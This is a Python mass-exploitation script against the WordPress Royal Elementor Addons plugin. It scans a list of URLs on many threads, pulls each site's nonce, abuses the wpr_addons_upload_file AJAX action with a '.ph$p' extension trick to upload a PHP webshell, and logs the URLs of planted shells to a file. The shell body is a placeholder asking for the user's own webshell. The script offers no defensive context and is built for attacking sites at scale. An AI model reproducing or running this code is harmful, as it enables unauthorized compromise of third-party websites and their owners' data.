import os
import re
import json
import asyncio
import requests
import logging
from colorama import Fore , Style , init
init (autoreset=True)
from random import choice
from string import ascii_lowercase
from platform import system
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

#colors
red = Fore.LIGHTRED_EX
bright = Style.BRIGHT
white = Fore.LIGHTWHITE_EX
# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
PYTHONWARNINGS = "ignore:Unverified HTTPS request"

# PHP Shell Code
PHP_UPLOAD_CODE = '''
这里放你的php马子
'''

# Logger setup
logging.basicConfig(filename='exploit.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

def get_nonce(host_data: str):
    """
    Extracts and returns the nonce value from the provided HTML content.

    Args:
        host_data (str): HTML content.

    Returns:
        str: Nonce value.
    """
    search = r'var WprConfig = {"ajaxurl":"[^"]*","resturl":"[^"]*","nonce":"([^"]+)"'
    match = re.search(search, host_data)
    nonce_value = match.group(1)
    return nonce_value

def save_file(filename, host):
    """
    Appends the given host to the specified file.

    Args:
        filename (str): Name of the file to save hosts.
        host (str): Host to save.
    """
    with open(filename, 'a') as w:
        w.write(f"{host}\n")

def check_vulnerability(host: str):
    """
    Checks if the target WordPress site is vulnerable and exploits the vulnerability if present.

    Args:
        host (str): Target WordPress site URL.
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    ]

    headers = {
        "User-Agent": choice(user_agents),
        "Referer": host,
    }

    try:
        logging.info(f"Checking: {host}")
        req = requests.get(host, headers=headers, timeout=10, verify=False).text
    except requests.RequestException as e:
        logging.error(f"An error occurred while checking {host}: {str(e)}")
        return

    if 'wpr-addons-js-js' in req:
        save_file('active-plugin.txt', host)
        nonce = get_nonce(req)
        data = {
            'action': 'wpr_addons_upload_file',
            'max_file_size': '0',
            'allowed_file_types': 'ph$p',
            'triggering_event': 'click',
            'wpr_addons_nonce': nonce
        }
        random_name = (''.join(choice(ascii_lowercase) for i in range(7)))
        files = {'uploaded_file': (random_name + '.ph$p', PHP_UPLOAD_CODE)}

        try:
            host_res = requests.post(f"{host}/wp-admin/admin-ajax.php", headers=headers, data=data,
                                     files=files, timeout=10, verify=False)
        except requests.RequestException as e:
            logging.error(f"An error occurred while exploiting {host}: {str(e)}")
            return

        if host_res.status_code == 200:
            try:
                host_res_json = host_res.json()
                if host_res_json["success"]:
                    uploaded_shell = host_res_json["data"]["url"]
                    logging.info(f"Uploaded Shell: {uploaded_shell}")
                    save_file('exploited.txt', uploaded_shell)
                else:
                    error_message = host_res_json["data"]["message"]
                    logging.error(f"Upload Error: {host} - {error_message}")
            except json.JSONDecodeError as e:
                logging.error("Failed to parse JSON response")
        else:
            logging.error(f"Upload Error: {host}")
    else:
        logging.warning(f"Royal Elementor Addons plugin not found: {host}")

async def main():
    """
    Asynchronously checks vulnerabilities for a list of URLs and provides a summary.
    """
    url_list_name = input('Enter the name of the URL list file: ').strip()
    thrd = int(input('Enter number of threads => '))
    url_list = [each_url for each_url in open(url_list_name, 'r', encoding='utf-8').read().splitlines()]

    total_urls = len(url_list)
    royal_elementor_urls = 0
    exploited_urls = 0

    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=thrd) as executor:
        await asyncio.gather(*(loop.run_in_executor(executor, check_vulnerability, url) for url in url_list))

    # Calculate summary statistics
    with open('active-plugin.txt', 'r') as active_file:
        royal_elementor_urls = len(active_file.readlines())
    with open('exploited.txt', 'r') as exploited_file:
        exploited_urls = len(exploited_file.readlines())

    # Display summary
    print("\n=== SUMMARY ===")
    print(f"Total URLs: {total_urls}")
    print(f"URLs with Royal Elementor Plugin: {royal_elementor_urls}")
    print(f"Exploited URLs: {exploited_urls}")

    # Log summary
    logging.info(f"Total URLs: {total_urls}")
    logging.info(f"URLs with Royal Elementor Plugin: {royal_elementor_urls}")
    logging.info(f"Exploited URLs: {exploited_urls}")


if __name__ == "__main__":
    clear()
    asyncio.run(main())



                        










